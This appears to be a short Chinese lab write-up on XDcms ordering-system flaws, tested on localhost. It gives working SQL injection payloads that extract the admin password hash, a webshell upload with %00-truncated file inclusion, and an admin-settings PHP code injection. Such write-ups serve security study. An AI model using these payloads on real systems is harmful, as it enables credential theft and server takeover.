---
title:  XDcms订餐系统
---

# 一、后台SQL注入点

> #### 注册登录后修改信息的地方存在SQL注入
>
> #### 存在大小写绕过

### 1、判断可以获取的参数个数

```
Cookie 输入：
-1 union  seLect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 
```



![image-20220103142324621](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142324621.png)

### 2、查看当前数据库

> 查看到当前数据库为xdcms

```
-1 union  seLect 1,2,3,4,5,6,7,8,9,10,11,12,13,database() ,15 
```

![image-20220103142524681](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142524681.png)

### 3、查看表

> c_admin

```
-1 union  seLect 1,2,3,4,5,6,7,8,9,10,11,12,13,(seLect table_name From information_schema.tables Where table_schema='xdcms' limit 0,1),15
```

### 4、查看密码

```
-1 union  seLect 1,2,3,4,5,6,7,8,9,10,11,12,13,password,15 From c_admin

破解MD5的密码为teat456
```

![image-20220103142355363](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142355363.png)

![image-20220103125853060](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/008i3skNly1gy0eb0mkqnj30hd03kgln.jpg)

# 二、文件上传文件包含漏洞

### 1、上传一句话木马照片

```
图片地址
http://127.0.0.1/uploadfile/image/20220103/20220103133831_10032.jpg
```

![image-20220103142408824](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142408824.png)

### 2、利用文件包含构造请求（%00截断）

```
http://127.0.0.1/xdcmsv10/api/index.php?c=../../xdcmsv10/uploadfile/image/20220103/20220103133831_10032.jpg%00
```

![image-20220103142417914](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142417914.png)



# 三、后台getshell 利用

> 利用方法/index.php?m=xdcms&c=setting

```
phpinfo');?><?php phpinfo();?>http://127.0.0.1/ 
```

![image-20220103142424373](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142424373.png)

![image-20220103142430746](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/image-20220103142430746.png)



































